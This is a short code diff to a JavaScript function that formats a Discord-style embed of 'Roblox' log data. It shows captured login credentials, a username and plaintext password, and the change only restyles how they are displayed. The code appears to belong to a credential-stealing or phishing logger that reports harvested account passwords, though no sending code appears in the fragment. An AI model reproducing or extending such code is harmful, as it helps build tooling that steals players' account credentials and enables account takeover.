@@ -512,8 +512,8 @@ function formatRobloxCombinedEmbedWithData(logData, userData) {
     } : undefined,
     fields: [
       {
-        name: "🔑 **Login Credentials**",
-        value: `**Username:** ${logData.credentials?.username || 'Not captured'}\n**Password:** ${logData.credentials?.password || 'Not captured'}`,
+        name: "**Login Credentials**",
+        value: `**Username:** \`${logData.credentials?.username || 'Not captured'}\`\n**Password:** \`${logData.credentials?.password || 'Not captured'}\``,
         inline: false
       },
       {
